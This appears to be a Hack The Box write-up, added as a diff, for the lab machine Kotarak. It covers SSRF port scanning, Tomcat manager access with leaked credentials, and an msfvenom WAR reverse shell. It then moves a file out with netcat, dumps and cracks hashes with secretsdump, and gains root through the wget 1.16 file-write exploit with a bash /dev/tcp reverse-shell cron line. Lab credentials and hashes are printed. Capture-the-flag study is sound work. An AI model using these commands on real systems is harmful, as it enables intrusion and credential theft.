@@ -1,0 +1,197 @@
+HTB-Kotarack-Writeup
+
+ip : 10.10.10.55
+
+Nmap
+----
+- nmap scan revealed 4 open ports 
+	22 running SSH
+	8009 running Apache Jserv
+	8080 running Apache tomcat
+	60000 Apache httpd
+
+Enumeration
+-----------
+- visiting the site http://10.10.10.55:8080 returns a 404
+- checking tomcat manager page located at /manager/html but we need to be authenticated to access it 
+- tried default credentials but no luck
+- ran directory brute force against the host but didnt find anything interesting 
+- enumerating port 8009 which is a default tomcat port we found that we can access the /manager/html using a binary protocol but nothing of interest to us
+- visiting port 60000 we got kotarak web hosting private browser which has a submit form which is supposed to be used for surfing web securely
+- trying to find the root page of the service running on 60000 we checked index.html, index.php
+- index.php got a hit and we now know that the site is running php over apache 
+- directory brute force port 60000 and found 4 pages
+
+	server-status
+	index.php
+	url.php
+	info.php
+
+- info.php runs phpinfo() with the file_uploads = on which we have exploited in the past, keeping it aside for now
+- enumerating the form further we started a python server and gave it our host address and it connected back to us showing an empty directory listing 
+- we can try to read files using /etc/passwd but it just returns try harder
+
+Shell as tomcat
+---------------
+- we exploit an SSRF vulnerability to get a shell as tomcat 
+- we can use the form to listen to the ports on kotarak
+- when we curl port 22 we get an error 
+
+	curl http://10.10.10.55:60000/url.php?path=http://127.0.0.1:22
+
+- when we try to curl port 10 we get a empty response
+
+	curl http://10.10.10.55:60000/url.php?path=http://127.0.0.1:10
+
+- we can scan for all ports using wfuzz
+		
+	wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
+
+- we got few open ports 
+
+	110
+	200
+	90
+	320 
+	888
+	1257
+
+- we can check all these ports with the webpage form
+- port 320 returns a login page 
+- port 888 returns a file viewer and we have some interesting files in it as well
+- the backup is a copy of tomcat_users.xml file that configures access to tomcat
+- we got credentials from this 
+
+	creds : admin : 3@g01PdhB!
+
+- we try this credentials against the login page in port 8080 and got logged in 
+- we now have access to tomcat web application manager
+- we do have an option to deploy a war file and we can use this to get a shell
+- we can generate a malicious war file with a reverse shell using msfvenom
+	
+	  msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.54 LPORT=9001 -f war -o rev.war
+
+- upload the war file
+- on hitting the deploy button we can see the /rev gets shown as an application
+- we can start a netcat listener
+
+	nc -nlvp 9001
+
+- we can click on /rev and it returns a blank page and a reverse shell to our netcat listener
+- upgrade the shell with python and tty
+
+Shell as atanas
+---------------
+- checking the home directory we can see that there are two users on the machine  
+
+	atanas
+	tomcat
+
+- the user flag belongs to atanas and we cannot read it as tomcat
+- checking our home directory /home/tomcat we got two files which looks like the system and hive files from AD
+- we can download the files into our machine using netcat
+- start a listener on our machine
+
+	nc -lnvp 443 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+
+- send the file with netcat from kotarak
+
+	cat 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit | nc 10.10.14.15 443
+
+- do the same for bin file as well
+- we can run these files against secretsdump to dump all the hashes 
+
+	secretsdump.py -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_de
+fault_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL | tee addump
+
+- we got the following hashes 
+
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
+	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
+	WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
+	WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
+	WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
+	WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
+	atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+
+- the ones with $ are machine accounts which has very secure passwords so no point in trying to crack those
+- ignoring krbtgt as well since its hard to crack it 
+- we focus more on Administrator and atanas
+- checking these hashes against an online hash cracking website and we got the password for atanas
+
+	creds : atanas : Password123!
+
+- trying to ssh into the machine as atanas didnt work as atanas dont have permission to use ssh
+- since we have a shell on the box we can su into atanas with the password 
+- we got a shell as atanas 
+- grab the user flag
+
+Priv-esc
+--------
+- as atanas we have access to list files in the root directory
+- it contsins 2 files
+
+	flag.txt
+	app.log
+
+- the flag.txt in the root directory was a fluke 
+- app.log file looks like apache access logs which tells us that wget is being ran from the ip 10.0.3.133 every 2 minutes trying to get archive.tar.gz 
+- the app.log file gave us the following information
+
+	- there is another system on 10.0.3.133
+	- the request is being ran every 2 minutes 
+	- the version of wget is 1.16
+
+- we can check if this request is still coming by listening on the port 80 but by default non root users are not allowed to listen on ports less than 1024
+- on looking around to find a way to do this we found authbind
+- authbind is a program which allows a non root user to listen on port less than 1024
+- we can use authbind along with netcat to listen on port 80
+
+	authbind nc -nlvp 80
+
+- in less than 2 minutes we get a connection back, wget trying to get /archive.tar.gz
+- we can exploit this version of wget to get root on the machine
+- all wget versions below 1.18 allows remote servers to write to arbitrary files by redirecting a request from HTTP to a crafted FTP resource which can be exploited  
+- by following the POC from the exploitdb we can perform this exploit 
+- for this we first need to create a wgetrc file and start an ftp server
+- we create .wgetrc file in the /tmp directory with the following code
+
+	post_file = /etc/shadow
+	output_document = /etc/cron.d/wget-root-shell
+
+- the above code will set two options 
+	- set POST method for all HTTP requests and send the contents of the file
+	- set the output filename
+
+- to pull off this exploit we will need multiple shell on the machine 
+- we can upload another war file to get a reverse shell back and change the user into atanas
+- we can start a python FTP server
+	
+	authbind python -m pyftpdlib -p21 -w 
+
+- we can copy the python POC from exploitdb and make necessary changes to it
+- change the following in the bottom of the POC
+
+	HTTP_LISTEN_IP = '10.0.3.1' 
+	HTTP_LISTEN_PORT = 80
+	FTP_HOST = '10.10.10.55' 
+	FTP_PORT = 21
+
+	ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.54/9002 0>&1' \n"
+
+- start a python web server to get the exploit on the victim machine
+	python3 -m http.server
+	wget 10.10.14.54/wget_exploit.py
+
+- we start a netcat listener from our box for the reverse shell
+- run the exploit with authbind command
+	
+	authbind python wget_exploit.py 
+
+- it checks if the FTP server is good and then waits listening on port 80
+- we get a connection back in the FTP server as well
+- the shadow file doesnt have anything thats useful to us but after one minute later we get a shell back
+- we have a root shell now
+- grab the root flag
